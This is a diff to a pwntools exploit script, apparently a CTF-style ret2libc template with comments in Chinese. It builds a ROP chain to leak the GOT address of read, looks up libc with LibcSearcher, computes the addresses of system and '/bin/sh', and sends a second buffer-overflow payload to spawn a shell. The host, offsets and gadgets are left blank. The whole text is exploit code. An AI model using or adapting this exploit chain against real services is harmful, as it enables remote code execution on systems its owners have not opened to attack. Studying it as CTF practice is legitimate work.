@@ -20,17 +20,20 @@ p = remote("",)
 elf = ELF("./")
 
 read_got = elf.got['read']
-puts_plt = elf.plt['puts']
-main_addr = 
+printf_plt = elf.plt['printf']
+main_addr = elf.sym['main']
 pop_rdi = 
+#pop_rsi = 
+#s_addr = 
 #************泄露got*********
 payload = b'a'*() + p64(pop_rdi) + p64(read_got)
-payload+= p64(puts_plt) + p64(main_addr) 
-#payload = payload.ljust(200,'b')
+payload+= p64(puts_plt) + p64(main_addr) #puts-read
+#payload = b'a'*(0x20+8) + p64(pop_rdi) + p64(s_addr) + p64(pop_rsi) + p64(read_got)
+#payload+= p64(0) + p64(printf_plt) + p64(main_addr) --printf-read
 p.sendline( payload)
 p.recvuntil('')
-read_addr = u64(p.recvuntil('\x0a')[:-1].ljust(8, '\x00'))
-print hex(read_addr)
+read_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
+log.info("read_addr => %#x", read_addr)
 #*****************************
 #***********搜索libc，寻址*******
 libc = LibcSearcher("read",read_addr)
@@ -39,9 +42,8 @@ sys_addr = offset + libc.dump("system")
 bin_sh_addr = offset + libc.dump("str_bin_sh")
 #***************************
 #************get shell************
-payload1 = b'a'*(0x40+8) + p64(pop_rdi) + p64(bin_sh_addr) 
+payload1 = b'a'*() + p64(pop_rdi) + p64(bin_sh_addr) 
 payload1+= p64(sys_addr) 
-payload1 = payload1.ljust(200,'b')
 
 p.sendline(payload1)
 
